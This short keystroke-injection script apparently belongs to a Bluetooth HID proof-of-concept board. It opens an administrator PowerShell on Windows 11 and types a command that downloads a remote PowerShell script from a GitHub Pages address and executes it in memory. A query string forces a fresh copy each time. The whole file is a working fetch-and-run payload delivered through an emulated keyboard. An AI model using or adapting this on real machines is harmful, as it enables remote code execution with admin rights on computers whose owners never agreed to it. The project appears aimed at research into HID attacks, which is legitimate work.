# Windows 11: elevated PowerShell (PairTool needs admin) -> fetch + run pair_win.ps1.
# ?_=(Get-Random) busts the WebClient/WinINET cache so edits take effect immediately.
# {MAC} = this board's BLE address, substituted at runtime.
RunPowershellAdmin
DELAY 3000
STRING & ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1?_=' + (Get-Random)))) -MAC '{MAC}'
ENTER
